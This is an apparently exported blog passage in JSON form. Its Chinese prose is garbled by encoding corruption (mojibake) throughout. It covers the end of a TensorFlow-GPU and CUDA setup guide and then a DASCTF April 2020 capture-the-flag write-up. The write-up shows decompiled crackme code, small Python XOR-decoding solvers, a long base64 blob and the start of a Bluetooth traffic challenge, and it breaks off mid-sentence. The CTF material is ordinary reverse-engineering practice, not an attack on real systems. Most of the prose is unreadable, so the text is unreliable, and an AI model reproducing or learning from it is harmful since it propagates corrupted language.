2.x çš„è¯è¿™ä¸ªæ–¹æ³•å·²ç» deprecated äº†ï¼Œå»ºè®®ç”¨tf.config.list_physical_devices('GPU') æ–¹æ³•ã€‚tf 1.x æ— æ­¤ç”¨æ³•ã€‚ WARNING: tensorflow:From &lt;stdin&gt;:1: is_gpu_available (from tensorflow.python.framework.test_util) is deprecated and will be removed in a future version.Instructions for updating:Use tf.config.list_physical_devices('GPU') instead. ä¹Ÿå¯ä»¥è¿è¡Œä¸€ä¸ªç¨‹åºï¼Œç„¶åå¦å¤–å†å¼€ä¸€ä¸ªç»ˆç«¯ï¼Œåˆ©ç”¨ nvidia-smi æŸ¥çœ‹æ˜¾å¡æƒ…å†µã€‚ åœ¨ Processes é‡Œçœ‹åˆ°è¿è¡Œçš„ä»»åŠ¡å°±æˆåŠŸäº†å‘€ï¼ å“‡å¥½è€¶ï¼ï¼ï¼ ç»ˆäºæå®šäº†ï¼ï¼ï¼ ä¹‹åä½ å°±å¯ä»¥æ„‰å¿«åœ°ç‚¼ä¸¹å•¦ï¼ 0x08 å°ç»“å…¶å®ä¸»è¦å°±æ˜¯è¿™å‡ ä¸ªæ­¥éª¤ï¼š å®‰è£… Ubuntu è™šæ‹Ÿæœº å®‰è£… NVIDIA æ˜¾å¡é©±åŠ¨åŠæˆæƒ å®‰è£… CUDA Toolkit å®‰è£… Anaconda3 å®‰è£… tensorflow-gpu ç‰ˆæœ¬ï¼ˆåŒ…æ‹¬äº† cuDNNï¼‰ æˆ–è€… å®‰è£… Ubuntu è™šæ‹Ÿæœº å®‰è£… NVIDIA æ˜¾å¡é©±åŠ¨åŠæˆæƒ å®‰è£… Docker nvidia-container-toolkit æ‹‰å– tensorflow-gpu é•œåƒ å…¶å®è¿‡ç¨‹æŒºéº»çƒ¦çš„ï¼Œè€Œä¸”é‡åˆ°äº†ä¸å°‘å‘ï¼Œæ¯”å¦‚æˆ‘è¿™æ¬¡çš„ä¸€éƒ¨åˆ†ç»å†â€¦â€¦ æ˜¾å¡é©±åŠ¨è£…äº†ï¼Œnvidia-smi çœ‹æ²¡é—®é¢˜ï¼Œè¿˜æœ‰ä¸ª CUDA Version å°±ä»¥ä¸ºæœ‰ CUDA äº†ã€‚è£…å¥½ anacondaï¼Œç„¶åç”¨ conda install tensorflow-gpuï¼Œè¿™é‡Œé¢é™„å¸¦äº† cuDNNã€‚ç„¶åæµ‹è¯• GPU çš„æ—¶å€™ç»™æˆ‘æŠ¥ tensorflow.python.framework.errors_impl.InternalError: CUDA runtime implicit initialization on GPU:0 failed. Status: all CUDA-capable devices are busy or unavailableè¿™ä¸ªé”™è¯¯ã€‚ã€‚è°·æ­Œæœäº†è€åŠå¤©æ²¡ææ‡‚ï¼Œç„¶åå»è£…äº† NVIDIA Container Toolkitï¼Œæ‹‰äº†ä¸ª tf çš„ Docker é•œåƒè·‘ï¼Œå‘ç°æ˜¯æ²¡é—®é¢˜çš„ã€‚æœ€åæƒ³åˆ°æ˜¯ä¸æ˜¯ CUDA æ²¡è£…ï¼Œäºæ˜¯çœ‹äº† tf é•œåƒç”¨çš„ CUDA ç‰ˆæœ¬æ˜¯10.1.243ï¼Œå»å®˜ç½‘æ‰¾æ¥è£…ä¸Šã€‚å†å›æ¥åˆ° conda ç¯å¢ƒé‡Œæµ‹è¯•ï¼Œç»ˆäºå¥½äº†ã€‚ã€‚ ç‰¹åˆ«æ˜¯è§‰å¾—é©¬ä¸Šè¦å®Œäº‹äº†ï¼Œåœ¨éªŒè¯ GPU æ—¶å€™å°±å‘ç°æŠ¥é”™äº†é‚£ç§æ—¶å€™ï¼Œå¾ˆç»æœ›ä¸æ˜¯å—ã€‚ ä¸è¿‡ä¸€æ­¥ä¸€æ­¥æ¥è¿˜æ˜¯å¯ä»¥æˆåŠŸå®‰è£…çš„ï¼Œå“‡æ˜¯æœ‰ç‚¹æˆå°±æ„Ÿ 23333. æœºå™¨å­¦ä¹ /æ·±åº¦å­¦ä¹ æœ‰ç©ºæ…¢æ…¢å­¦å‘¢ï¼ˆ å‘œï¼Œæ„Ÿè§‰è«åå¥‡å¦™æˆè¿ç»´çš„äº†ï¼Œå˜¤å˜¤å˜¤ä¸è¦ã€‚ ï¼ˆï¼ˆæºœäº†æºœäº†å–µ 0xFF References &amp; Extensive Reading NVIDIA è™šæ‹Ÿ GPU æ·±ä¿¡æœè¶…èåˆTensorflow-vGPUç‰ˆé…ç½®æŒ‡å¯¼ NVIDIA CUDA Toolkit Release Notes TensorFlow å®˜æ–¹å®‰è£…æ•™ç¨‹ Ubuntu 18.04å®‰è£…CUDAå’ŒcuDNN Ubuntu16.04ä¸‹å®‰è£…cudaå’Œcudnnçš„ä¸‰ç§æ–¹æ³• TensorFlow å®‰è£…ä¸ç¯å¢ƒé…ç½®ï¼ˆç®€å•ç²—æš´ TensorFlow 2ï¼‰ RuntimeError: CUDA error: all CUDA-capable devices are busy or unavailable","path":"2020/04/29/Server_TensorFlow-vGPU/"},{"title":"CTF | 2020 DASCTF å››æœˆæ˜¥å­£æˆ˜ Re&Misc WriteUp","text":"å‰è¨€ å®‰æ’æœˆèµ›ï¼Œ2020å¹´DASCTFâ€”â€”å››æœˆæ˜¥å­£æˆ˜ã€‚ æ¯”èµ›æ—¶é—´ï¼š2020å¹´4æœˆ25æ—¥ä¸‹åˆ13:30-17:30 æ¯”èµ›å¹³å°ï¼šhttps://www.linkedbyx.com/studyCenter/36998/tasks è¯·æäº¤flag{}/DASCTF{}æ‹¬å·é‡Œé¢çš„å†…å®¹ã€‚ ä»Šå¤©ä¸‹åˆæœ‰ä¸ª DASCTF å®‰æ’æœˆèµ›ï¼Œå››æœˆæ˜¥å­£æˆ˜ï¼Œéš¾åº¦æ®èµµå¸ˆå‚…è¯´â€œé›¨éœ²å‡æ²¾â€ï¼Œå°±æ¥çœ‹äº†çœ‹é¢˜ã€‚ å…¶å®è¿˜æ˜¯å¤§æ¦‚æ¯”èµ›å¼€å§‹ä¹‹åä¸€ä¸¤ä¸ªå°æ—¶æ‰æ³¨å†Œçš„ï¼Œäºæ˜¯åˆ’äº†ä¸ªæ°´ï¼Œå¤§æ¦‚çœ‹äº†å‡ é“ Re å’Œ Misc çš„é¢˜ï¼Œéšä¾¿å†™å†™ WP å§ã€‚ ï¼ˆå…¶å®ä¹Ÿæ²¡å‡ é“é¢˜ä¼šåšçš„ï¼Œæœ‰çš„è¿˜æ˜¯èµ›åè¡¥çš„ï¼Œå‘œã€‚ Reverseå…¥é—¨reverseé¢˜ç›®é™„ä»¶ï¼šåœ¨è¿™é‡Œ æ‹–è¿› IDA çœ‹ä¸‹ã€‚ int __cdecl main(int argc, const char **argv, const char **envp) { size_t i; // [esp+28h] [ebp-80h] char v5; // [esp+30h] [ebp-78h] char v6[8]; // [esp+A0h] [ebp-8h] _alloca(0x10u); __main(); std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((int)&amp;std::cout, \"input your key: \"); std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cin, &amp;v5); for ( i = 0; i &lt; strlen(&amp;v5); ++i ) v6[i - 112] = (v6[i - 112] ^ 6) + 1; if ( !strcmp(&amp;v5, \"akhb~chdaZrdaZudqduvdZvvv|\") ) std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((int)&amp;std::cout, \"yes!you are right\"); else std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((int)&amp;std::cout, \"try again\"); system(\"PAUSE\"); return 0; } A0h-30h æ­£å¥½å°±æ˜¯åè¿›åˆ¶çš„ 112ï¼Œäºæ˜¯ v6[i - 112] å¯¹åº”çš„å°±æ˜¯ v5 çš„åœ°å€ã€‚ Expï¼š # -*- coding:utf-8 -*- s=\"akhb~chdaZrdaZudqduvdZvvv|\" new='' for i in s: t=(ord(i)-1)^6 new+=chr(t) print(new) flag{daef_wef_reverse_sss} å“‡å¥½è€¶ï¼Œå¥½ä¹…æ²¡çœ‹åˆ°è¿™ä¹ˆç®€å•çš„ Re é¢˜äº†å”‰ï¼ encrypt3é¢˜ç›®é™„ä»¶ï¼šåœ¨è¿™é‡Œ åŒæ ·æ‹–è¿› IDAã€‚ signed __int64 __fastcall main(__int64 a1, char **a2, char **a3) { __int64 v3; // rax __int64 v5; // rdx __int64 v6; // rax __int64 v7; // rdx __int64 v8; // rax __int64 v9; // rdx char v10; // [rsp+17h] [rbp-49h] int v11; // [rsp+18h] [rbp-48h] int i; // [rsp+1Ch] [rbp-44h] int j; // [rsp+20h] [rbp-40h] int k; // [rsp+24h] [rbp-3Ch] __int64 v15; // [rsp+28h] [rbp-38h] char v16; // [rsp+30h] [rbp-30h] char v17; // [rsp+31h] [rbp-2Fh] char v18; // [rsp+32h] [rbp-2Eh] char v19; // [rsp+33h] [rbp-2Dh] char v20; // [rsp+34h] [rbp-2Ch] char v21; // [rsp+35h] [rbp-2Bh] char v22; // [rsp+36h] [rbp-2Ah] char v23; // [rsp+37h] [rbp-29h] char v24; // [rsp+38h] [rbp-28h] char v25; // [rsp+39h] [rbp-27h] char v26; // [rsp+3Ah] [rbp-26h] char v27; // [rsp+3Bh] [rbp-25h] char v28; // [rsp+3Ch] [rbp-24h] char v29; // [rsp+3Dh] [rbp-23h] char v30; // [rsp+3Eh] [rbp-22h] char v31; // [rsp+3Fh] [rbp-21h] char v32; // [rsp+40h] [rbp-20h] char v33; // [rsp+41h] [rbp-1Fh] char v34; // [rsp+42h] [rbp-1Eh] char v35; // [rsp+43h] [rbp-1Dh] char v36; // [rsp+44h] [rbp-1Ch] char v37; // [rsp+45h] [rbp-1Bh] char v38; // [rsp+46h] [rbp-1Ah] char v39; // [rsp+47h] [rbp-19h] char v40; // [rsp+48h] [rbp-18h] char v41; // [rsp+49h] [rbp-17h] char v42; // [rsp+4Ah] [rbp-16h] char v43; // [rsp+4Bh] [rbp-15h] char v44; // [rsp+4Ch] [rbp-14h] char v45; // [rsp+4Dh] [rbp-13h] char v46; // [rsp+4Eh] [rbp-12h] char v47; // [rsp+4Fh] [rbp-11h] char v48; // [rsp+50h] [rbp-10h] char v49; // [rsp+51h] [rbp-Fh] char v50; // [rsp+52h] [rbp-Eh] char v51; // [rsp+53h] [rbp-Dh] char v52; // [rsp+54h] [rbp-Ch] char v53; // [rsp+55h] [rbp-Bh] unsigned __int64 v54; // [rsp+58h] [rbp-8h] v54 = __readfsqword(0x28u); v16 = 38; v17 = 44; v18 = 33; v19 = 39; v20 = 59; v21 = 35; v22 = 34; v23 = 115; v24 = 117; v25 = 114; v26 = 113; v27 = 33; v28 = 36; v29 = 117; v30 = 118; v31 = 119; v32 = 35; v33 = 120; v34 = 38; v35 = 114; v36 = 117; v37 = 113; v38 = 38; v39 = 34; v40 = 113; v41 = 114; v42 = 117; v43 = 114; v44 = 36; v45 = 112; v46 = 115; v47 = 118; v48 = 121; v49 = 112; v50 = 35; v51 = 37; v52 = 121; v53 = 61; v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Please input your magic number\", a3); std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::istream::operator&gt;&gt;(&amp;std::cin, &amp;v11); if ( v11 &lt;= 9 ) return 0xFFFFFFFFLL; v15 = operator new[](v11); for ( i = 0; i &lt; v11; ++i ) std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cin, i + v15); v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"You have input sth.\", v5); std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v8 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"I will mix them with the enc_flag!\", v7); std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); for ( j = 0; j &lt;= 37; ++j ) { v10 = 0; for ( k = 0; k &lt; v11; ++k ) v10 ^= *(_BYTE *)(k + v15); putchar(v10 ^ (unsigned __int8)*(&amp;v16 + j)); } std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"\\nMaybe you have found the `flag`\\n\", v9); return 0LL; } æ˜¯ Cpp å”‰ã€‚è™½ç„¶é€†å‘å‡ºæ¥æœ‰ç‚¹ä¸‘emmmã€‚ å¤§æ¦‚æ„æ€æ˜¯å…ˆè®©ä½ è¾“å…¥ä¸€ä¸ª magic numberï¼Œå¦‚æœv11 &lt;= 9åˆ™è¿”å› -1 é€€å‡ºï¼Œè¯´æ˜è¾“å…¥çš„æ•°è¦å¤§äº9ã€‚ ç„¶åä¾æ¬¡è¾“å…¥v11ä¸ªæ•°ï¼Œå­˜åˆ°v15åŠä¹‹åçš„ç©ºé—´å†…ã€‚ åé¢è¾“å‡ºäº†ä¸€ä¸ª enc_flagã€‚é‡ç‚¹å°±æ˜¯è¿™å‡ å¥å˜›ã€‚ for ( j = 0; j &lt;= 37; ++j ) { v10 = 0; for ( k = 0; k &lt; v11; ++k ) v10 ^= *(_BYTE *)(k + v15); putchar(v10 ^ (unsigned __int8)*(&amp;v16 + j)); } std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"\\nMaybe you have found the `flag`\\n\", v9); æ­£å¥½å‰é¢é‚£ä¸²æ•°å­—å°±æœ‰38ä¸ªã€‚çœ‹æ¥èµ·å§‹çš„å‡ ä¸ªå­—ç¬¦ä¸º flagã€‚ v10ä¾æ¬¡å’Œè¾“å…¥çš„æ¯ä¸ªæ•°å¼‚æˆ–ä¸€ä¸‹ï¼Œå†è¾“å‡ºv10å’Œæœ€å¼€å§‹é‚£ä¸²æ•°å­—å¼‚æˆ–çš„ç»“æœã€‚ é€†å‘çš„è¯ï¼Œåªè¦æ‰¾åˆ° flag å°±å®Œäº‹äº†ï¼ äºæ˜¯ç›´æ¥çˆ†ç ´å¥½äº†ï¼ Expï¼š è¾“äº†å‡ ä¸ªæ•°å­—è§‰å¾—å¤ªéº»çƒ¦äº†ï¼Œäºæ˜¯ç›´æ¥æ­£åˆ™åŒ¹é…å¥½äº†ã€‚ import re s = \"\"\" v16 = 38; v17 = 44; v18 = 33; v19 = 39; v20 = 59; v21 = 35; v22 = 34; v23 = 115; v24 = 117; v25 = 114; v26 = 113; v27 = 33; v28 = 36; v29 = 117; v30 = 118; v31 = 119; v32 = 35; v33 = 120; v34 = 38; v35 = 114; v36 = 117; v37 = 113; v38 = 38; v39 = 34; v40 = 113; v41 = 114; v42 = 117; v43 = 114; v44 = 36; v45 = 112; v46 = 115; v47 = 118; v48 = 121; v49 = 112; v50 = 35; v51 = 37; v52 = 121; v53 = 61; \"\"\" t = re.compile(r'v\\d{2} = (\\d+);') result = re.findall(t, s) # print(result) l = list(map(int, result)) print(l) # [38, 44, 33, 39, 59, 35, 34, 115, 117, 114, 113, 33, 36, 117, 118, 119, 35, 120, 38, 114, 117, 113, 38, 34, 113, 114, 117, 114, 36, 112, 115, 118, 121, 112, 35, 37, 121, 61] å¾—åˆ°ä¸€ç³»åˆ—çš„æ•°å­—ï¼Œè½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ä¸Šé¢ç”¨äº† mapï¼Œä¸‹é¢è¿™é‡Œç”¨ç”¨ç”Ÿæˆå¼çš„å†™æ³•ï¼Œå˜»å˜»ã€‚ è€Œåå…ˆæ‰¾å‡ºflagå¯¹åº”çš„v10ï¼Œå†ç”¨å®ƒæ¥å¼‚æˆ–å°±å®Œäº‹äº†ã€‚ l_str = [chr(x) for x in l] s2 = ''.join(l_str) print(s2) # &amp;,!';#\"surq!$uvw#x&amp;ruq&amp;\"qrur$psvyp#%y= for i in range(10, 100): tmp = chr(ord(s2[0]) ^ i) if tmp == 'f'or tmp == 'F': print(tmp, i) # f 64 # F 96 final = '' for x in s2: final += chr(ord(x) ^ 64) print(final) # flag{cb3521ad567c8f251fb1252d03690ce9} å¾—åˆ° flagï¼š flag{cb3521ad567c8f251fb1252d03690ce9} Miscï¼ˆç­¾åˆ°é¢˜ï¼‰6Gè¿˜è¿œå—ï¼Ÿ 5Géƒ½æ¥äº†ï¼Œ6Gè¿˜è¿œå—ï¼Ÿ6Gä¸‹è¿˜éœ€è¦å¼€ä¼šå‘˜æ‰èƒ½é«˜é€Ÿä¸‹è½½å—ï¼Ÿè¯·æäº¤ DASCTF{} é‡Œçš„å†…å®¹ã€‚ http://server.zhaoj.in:8888/1GTest.file or http://das.wetolink.com:8888/1GTest.file æ–‡ä»¶å¤§å°æ˜¾ç¤ºæ˜¯ 977MBï¼Œç„¶è€Œä¸‹è½½é€Ÿåº¦æ…¢åˆ° 1KB/s ä¸åˆ°ï¼Œè¿˜ä¸å…è®¸å¤šçº¿ç¨‹â€¦â€¦ æƒ³åˆ°ä¼°è®¡æ˜¯å‡çš„æ–‡ä»¶ï¼Œæ¯•ç«Ÿæ˜¯ç­¾åˆ°é¢˜ï¼Œåº”è¯¥ä¸éš¾çš„ã€‚ï¼ˆæ‰ä¸åƒä¸Šä¸ªæ¯”èµ›å‡çš„ç­¾åˆ° äºæ˜¯æŒ‰ä¸‹ F12ï¼Œå°±çœ‹æ¥æ”¶åˆ°çš„è¿™éƒ¨åˆ† payload å¥½äº†ã€‚ æˆ–è€…å°±æ¥æ”¶ä¸€éƒ¨åˆ†ç„¶åæˆªæ–­ä¹Ÿè¡Œã€‚ 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 æ‰”å» base64 è§£å¯†ï¼Œå°±å¯ä»¥å¾—åˆ° flagã€‚ æœç„¶ flag å°±åœ¨æ–‡ä»¶æœ€å¼€å¤´å“ˆå“ˆå“ˆ~ DASCTF{welcome_to_DAS_Ap1r1} blueshark Can you dig something you want out from the sea-colored beautiful shark? é¢˜ç›®é™„ä»¶ï¼šåœ¨è¿™é‡Œ ä¸€ä¸ªæµé‡åŒ…ï¼Œçœ‹äº†æ˜¯è“ç‰™åè®®ï¼Œå‘œåˆæ˜¯æ²¡è§è¿‡çš„ã€‚å‘ç° Wireshark è¿˜å¯ä»¥åˆ†æè“ç‰™æ•°æ®åŒ…å”‰ã€‚ï¼ˆï¼ˆå…¶å®å¥½å¤šéƒ½å¯ä»¥ binwalk å‘ç°äº†ä¸€ä¸ª 7z çš„å‹ç¼©åŒ…ï¼Œç›´æ¥å½“æˆå‹ç¼©åŒ…æ‰“å¼€ï¼Œå‘ç°æœ‰ä¸ª password_is_Bluetooth_PIN.txtæ–‡ä»¶ï¼Œçœ‹æ¥å¾—æ‰¾ PIN äº†ã€‚ ä»æ•°æ®åŒ…è¿™é‡Œä¹Ÿæ‰¾åˆ°äº†è¿™ä¸ªå‹ç¼©åŒ…ã€‚ æœ¬æ¥ä»¥ä¸º PIN å°±æ˜¯4ä½çš„ï¼Œè¿˜æƒ³çˆ†ç ´ä¸€æ³¢ã€‚ã€‚ç»“æœå‘ç°ä¸æ˜¯ã€‚ åé¢å¤§ä½¬è¯´æ˜¯åœ¨ç½‘ç»œæµé‡Œå¯ä»¥æ‰¾åˆ° PINï¼Œemmmï¼Ÿ å™¢ï¼ŒCtrl + Fï¼Œé€‰æ‹© åˆ†ç»„è¯¦æƒ… æˆ–è€… åˆ†ç»„åˆ—è¡¨ï¼Œå­—ç¬¦ä¸² æˆ–è€… æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¿™æ 